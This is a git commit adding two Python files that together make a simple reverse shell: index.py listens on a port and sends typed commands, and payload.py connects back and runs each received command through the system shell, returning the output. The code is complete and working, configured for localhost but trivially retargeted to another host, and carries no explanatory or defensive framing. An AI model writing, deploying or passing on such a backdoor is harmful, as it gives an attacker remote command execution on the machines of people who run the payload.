26bb0f2119e1ab10edefe7a13d9614ff969b0502
steve bazaar <stevebazaar99@gmail.com>
2024-12-20 09:50:36 +0300

    main

---
+++ index.py
@@ -0,0 +1,33 @@
+import socket
+
+
+HOST = 'localhost'
+PORT = 6767
+
+# create socket
+server = socket.socket()
+server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+server.bind((HOST, PORT))
+server.listen(1)
+
+while True:
+    print(f'[+] Listening on {HOST}:{PORT}')
+    client = server.accept()
+    print(f'[+] client connected {client[1]}')
+
+    client[0].send('connected'.encode())
+    while True:
+        cmd = input('>>>')
+        client[0].send(cmd.encode())
+
+        if cmd.lower() in ['QUIT', 'quit', 'q', 'x']:
+            break
+
+        result = client[0].recv(10240).decode()
+        print(result)
+    client[0].close()
+    cmd = input('Wait for new client y/n: ') or 'y'
+    if cmd.lower() in ['n', 'no']:
+        break
+server.close()
+
---
+++ payload.py
@@ -0,0 +1,41 @@
+import socket
+import sys
+import subprocess
+import threading
+
+HOST = 'localhost'
+PORT = 6767
+
+# create socket
+client = socket.socket()
+client.connect((HOST, PORT))
+
+msg = client.recv(10240).decode()
+print(f'[*] server:',msg)
+
+
+def startProcess(cmd):
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True)
+    except Exception as error:
+        errMessage = str(error).encode()
+        client.send(errMessage)
+        client.close()
+
+    if result.returncode == 0:
+        if len(result.stdout.decode()) != 0:
+            client.send(result.stdout)
+        else:
+            client.send('Process Started'.encode())
+    else:
+        client.send('[+] Command Error!'.encode())
+
+while True:
+    cmd = client.recv(10240).decode()
+    print(f'[+]command: {cmd}') 
+    if cmd.lower() in ['q', 'quit', 'exit', 'x']:
+        break
+    t1 = threading.Thread(target=startProcess, args=(cmd,))
+    t1.run()
+
+client.close()
